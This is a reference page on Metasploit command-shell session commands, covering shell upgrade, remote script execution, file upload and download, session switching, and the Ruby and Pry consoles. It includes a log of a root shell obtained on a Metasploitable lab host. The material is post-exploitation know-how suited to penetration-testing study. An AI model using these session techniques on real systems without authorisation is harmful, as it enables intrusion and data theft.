# Usage

Search Tag(s): #metasploit-framework #command-and-control #living-off-the-land

## 01 - Help Menu

```
help

Meta shell commands
===================

    Command     Description
    -------     -----------
    help        Help menu
    background  Backgrounds the current shell session
    sessions    Quickly switch to another session
    resource    Run a meta commands script stored in a local file
    shell       Spawn an interactive shell (*NIX Only)
    download    Download files
    upload      Upload files
    source      Run a shell script on remote machine (*NIX Only)
    irb         Open an interactive Ruby shell on the current session
    pry         Open the Pry debugger on the current session
```

## 02 - Interactive Meta Shell

Make the Meta shell fully interactive. To make full use with other commands such as, `passwd` and `su [username]`.

```
[*] Command shell session 1 opened (10.0.2.4:34869 -> 192.168.56.106:6200 ) at 2022-03-29 03:43:52 -0400

shell
[*] Trying to find binary 'python' on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash
root@metasploitable:/# id
id
uid=0(root) gid=0(root)
root@metasploitable:/#
```

## 03 - Source Script

Execute a local shell script file on remote machine. `y` represent execute the script in background, `n` represent on foreground

```
source script.sh <y | n>
```

## 04 - Upload and Download

Upload files.

```
upload /path/to/local/file /path/to/remote/file
```

Download files.

```
download /path/to/remote/file /path/to/local/file
```

## 05 - Switch Interactive Sessions

```
sessions <session_id>
```

## 06 - Background Session

```
background
```

## 07 - Resource Script to Automate Commands

```
resource /path/to/local/resource_1.rc /path/to/local/resource_n.rc
```

## 08 - Interactive Ruby Shell

```
irb
```

## 09 - Debug Current Session

```
pry
```